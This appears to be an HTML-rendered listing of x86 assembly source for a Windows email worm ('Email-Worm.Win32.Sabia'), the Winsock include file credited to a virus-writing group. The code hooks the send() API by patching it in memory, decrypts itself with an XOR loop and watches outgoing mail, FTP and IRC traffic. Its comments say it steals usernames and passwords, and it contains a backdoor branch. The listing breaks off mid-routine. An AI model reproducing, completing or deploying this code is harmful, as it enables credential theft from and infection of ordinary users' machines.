<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Sabia - _winsock.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">   </span><span class="sc1">; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II</span><span class="sc0">
   </span><span class="sc1">; </span><span class="sc0">
   </span><span class="sc1">; by: NBK &amp; Ultras / MATRiX</span><span class="sc0">

   </span><span class="sc5">trojan@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; send()</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trojan@006</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wsock32_loader</span><span class="sc0">

   </span><span class="sc5">trojan@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; connect()</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trojan@006</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">trojan@004</span><span class="sc0">

   </span><span class="sc5">trojan@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; recv()</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trojan@006</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">trojan@007</span><span class="sc0">

   </span><span class="sc5">trojan@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETCRYPT</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mark_crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc12">'YX'</span><span class="sc0"> </span><span class="sc1">;   </span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">wsock_de</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">wsock_de</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">dword_wsock_de</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">dword_wsock_de2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> 

   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc5">wsock_decrypt</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">wsock_decrypt</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">delta_x</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'='</span><span class="sc0">

   </span><span class="sc5">rnd_crypt</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">   </span><span class="sc1">;   rnd crypt style</span><span class="sc0">

   </span><span class="sc5">x_alloc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_GlobalAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">wsock32_loader</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc1">; send() is free to be called by me</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_send_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   size of the buffer to be sent</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   data to be sent</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   socket</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">send_repcode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;   return address</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_ret_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">alloc_send_ok</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">x_alloc</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">alloc_send_ok</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; Prevent invalid arguments</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETSEH</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">send_error</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">     </span><span class="sc1">;   invalid socket</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">     </span><span class="sc1">;   invalid size</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_IsBadReadPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LIAM'</span><span class="sc0">  </span><span class="sc1">;   From...</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chk_mail</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TPCR'</span><span class="sc0">  </span><span class="sc1">;   To...</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chk_rcpt</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TIUQ'</span><span class="sc0">  </span><span class="sc1">;   email , ftp or IRC</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chk_quit</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ATAD'</span><span class="sc0">  </span><span class="sc1">;   sending email</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chk_data</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'RESU'</span><span class="sc0">  </span><span class="sc1">;   steal username </span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chk_user</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SSAP'</span><span class="sc0">  </span><span class="sc1">;   steal password</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chk_pass</span><span class="sc0">

   </span><span class="sc5">ret_send</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETSEH</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">ret_send_noseh</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
   </span><span class="sc5">ap_send</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">send_repcode</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SII'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_send_backdoor</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_send_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">no_send_backdoor</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
   </span><span class="sc5">jump_send_byte</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">orig_send_byte</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">push_ret_send</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">send_error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETSEH</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send_noseh</span><span class="sc0">

   </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">chk_mail</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">buffer_mail</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">  </span><span class="sc1">;  not compatible email software</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MORF'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_mail</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MORF'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">

   </span><span class="sc5">cp_mail</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">mail_cped</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cp_mail</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc1">;   our mail string is not complete, erase this buffer</span><span class="sc0">

   </span><span class="sc5">get_mail_str_rev</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">std</span><span class="sc0">
   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LIAM'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">get_mail_str_rev</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">mail_cped</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">chk_rcpt</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">buffer_rcpt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">buffer_mail</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
